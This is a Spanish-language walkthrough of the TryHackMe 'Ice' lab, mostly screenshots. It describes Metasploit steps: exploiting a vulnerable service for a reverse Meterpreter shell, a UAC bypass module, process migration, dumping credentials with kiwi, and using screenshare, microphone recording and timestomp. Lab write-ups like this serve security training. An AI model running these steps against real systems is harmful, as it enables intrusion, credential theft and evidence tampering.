# THM - Ice
[TryHackMe-Ice](https://tryhackme.com/room/ice)

Para comenzar el análisis se realiza un **nmap** a la ip de la máquina.

![Nmap](/img/ice1.png)

*Try Hack Me*  
![THM1](/img/ice2.png)

*Try Hack Me*  
![THM2](/img/ice3.png)

*Try Hack Me*  
![THM3](/img/ice4.png)

Una vez se conoce el programa vulnerable, puede buscarse el CVE asociado.

![cve](/img/ice5.png)

*Try Hack Me*  
![THM4](/img/ice6.png)

*Try Hack Me*  
![THM5](/img/ice7.png)

A continuación hay que buscar un *exploit* en **Metasploit**, con el comando *msfconsole*.

![msfconsole](/img/ice8.png)

*Try Hack Me*  
![THM6](/img/ice9.png)

Configurar las opciones del *exploit*.

![options](/img/ice10.png)

*Try Hack Me*  
![THM7](/img/ice11.png)

```
set rhosts (ip THM)
set lhost (ip vpn)
run
```

Al lanzar el *exploit* se accede a la terminal ***meterpreter***.

![meterpreter](/img/ice12.png)

*Try Hack Me*  
![THM8](/img/ice13.png)

Se identifica al usuario del sistema.

![getuid](/img/ice14.png)

*Try Hack Me*  
![THM9](/img/ice15.png)

Ver la información del sistema.

![sysinfo1](/img/ice16.png)

*Try Hack Me*  
![THM10](/img/ice17.png)

*Try Hack Me*  
![THM11](/img/ice18.png)

Ejecutar el comando que propone el enunciado.

![comando](/img/ice19.png)

*Try Hack Me*  
![THM12](/img/ice20.png)

Pulsar *Ctrl + z* para volver a la consola de Metasploit.

Ver las opciones del *exploit*.

![options2](/img/ice21.png)

*Try Hack Me*  
![THM13](/img/ice22.png)

Ejecutar lo siguiente:  
```
use exploit/windows/local/bypassuac_eventvwr
set session (sesión de meterpreter)
set lhost (ip vpn)
run
```

Una vez dentro de la nueva consola de *meterpreter* ver los privilegios.

![privilegios](/img/ice23.png)

*Try Hack Me*  
![THM14](/img/ice24.png)

Ver la lista de procesos e identificar el de *spool*.

![procesos](/img/ice25.png)

*Try Hack Me*  
![THM15](/img/ice26.png)

Migrar a dicho proceso e identificar al usuario.

![migrar](/img/ice27.png)

*Try Hack Me*  
![THM16](/img/ice28.png)

Cargar *kiwi* y ver los comandos disponibles ejecutando *help* y buscar el que otorga todas las credenciales.

![credenciales](/img/ice29.png)

*Try Hack Me*  
![THM17](/img/ice30.png)

Buscar la contraseña del usuario.

![contraseña](/img/ice31.png)

*Try Hack Me*  
![THM18](/img/ice32.png)

Ver la lista de comandos y buscar los requeridos en cada pregunta.

![hashdump](/img/ice33.png)

*Try Hack Me*  
![THM19](/img/ice34.png)

![screenshare](/img/ice35.png)

*Try Hack Me*  
![THM20](/img/ice36.png)

![record_mic](/img/ice37.png)

*Try Hack Me*  
![THM21](/img/ice38.png)

![timestomp](/img/ice39.png)

*Try Hack Me*  
![THM22](/img/ice40.png)